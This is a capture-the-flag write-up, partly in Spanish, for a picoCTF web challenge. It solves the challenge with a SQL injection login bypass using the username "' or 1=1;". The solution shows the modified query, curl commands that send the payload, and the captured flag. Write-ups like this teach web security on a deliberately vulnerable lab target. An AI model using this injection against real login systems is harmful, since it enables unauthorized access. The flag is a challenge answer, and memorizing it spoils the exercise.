## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!

## Pistas
- There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
- Try to think about how the website verifies your login.

## Solución
```
username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'

# Login failed.


username: ' or 1=1;
password: admin
SQL query: SELECT * FROM users WHERE name='' or 1=1;' AND password='admin'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}



Solucion en consola:
C:\Users\yahir>curl https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username=admin&password=admin"
<h1>Login failed.</h1>
C:\Users\yahir>curl https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username=' or 1=1;&password=admin&debug=1"
<pre>username: ' or 1=1;
password: admin
SQL query: SELECT * FROM users WHERE name='' or 1=1;' AND password='admin'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}</p>
```

## Notas adicionales
- el parametro -d del curl puede enviar datos
- el ampersand permite separar los parametros que se van a enviar

## Referencias

